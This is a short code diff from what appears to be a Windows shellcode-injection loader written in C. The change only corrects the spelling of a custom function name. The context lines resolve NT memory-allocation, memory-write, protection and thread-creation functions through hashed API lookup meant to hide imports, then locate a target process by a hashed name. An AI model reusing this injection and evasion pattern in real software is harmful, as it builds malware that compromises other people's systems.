@@ -72,13 +72,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         BOOL rv;
         
         // Resolve function pointers for memory and thread operations
-        NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
-        NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
-        NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
-        NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
-        NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);
-        OpenProc _OpenProcess = (OpenProc)CustomGetProcAdress(hKernel32dll, OPEN_PROCESS_HASH);
-        CloseHndle _CloseHandle = (CloseHndle)CustomGetProcAdress(hKernel32dll, CLOSE_HANDLE_HASH);
+        NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAddress(hNtdll, VIRTUAL_ALLOC_HASH);
+        NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAddress(hNtdll, WRITE_MEMORY_HASH);
+        NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAddress(hNtdll, VIRTUAL_PROTECT_HASH);
+        NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAddress(hNtdll, CREATE_THREAD_HASH);
+        NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAddress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);
+        OpenProc _OpenProcess = (OpenProc)CustomGetProcAddress(hKernel32dll, OPEN_PROCESS_HASH);
+        CloseHndle _CloseHandle = (CloseHndle)CustomGetProcAddress(hKernel32dll, CLOSE_HANDLE_HASH);
         
         // Retrieve target process ID
         DWORD pid = _GetProcessID(hKernel32dll, TARGET_PROCESS_NAME_HASH);
